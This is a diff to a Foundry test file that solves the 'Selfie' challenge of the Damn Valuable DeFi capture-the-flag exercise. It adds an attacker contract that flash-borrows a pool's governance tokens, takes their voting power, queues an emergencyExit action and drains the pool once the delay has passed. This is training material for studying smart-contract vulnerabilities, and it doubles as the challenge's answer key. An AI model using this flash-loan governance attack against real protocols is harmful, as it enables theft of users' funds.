@@ -6,6 +6,51 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+    DamnValuableVotes private token;
+    address private recovery;
+    uint256 public actionId;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // Borrow all tokens from the pool
+        uint256 amount = token.balanceOf(address(pool));
+        pool.flashLoan(this, address(token), amount, "");
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        // Delegate votes to ourselves to gain voting power
+        token.delegate(address(this));
+
+        // Queue governance action to call emergencyExit
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        actionId = governance.queueAction(address(pool), 0, data);
+
+        // Approve pool to take the tokens back
+        token.approve(address(pool), amount);
+
+        return CALLBACK_SUCCESS;
+    }
+
+    function executeAction() external {
+        governance.executeAction(actionId);
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +107,17 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // Deploy attacker contract
+        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
+
+        // Execute the attack - borrow tokens and queue governance action
+        attacker.attack();
+
+        // Fast forward 2 days to pass the governance delay
+        vm.warp(block.timestamp + 2 days);
+
+        // Execute the governance action to drain the pool
+        attacker.executeAction();
     }
 
     /**
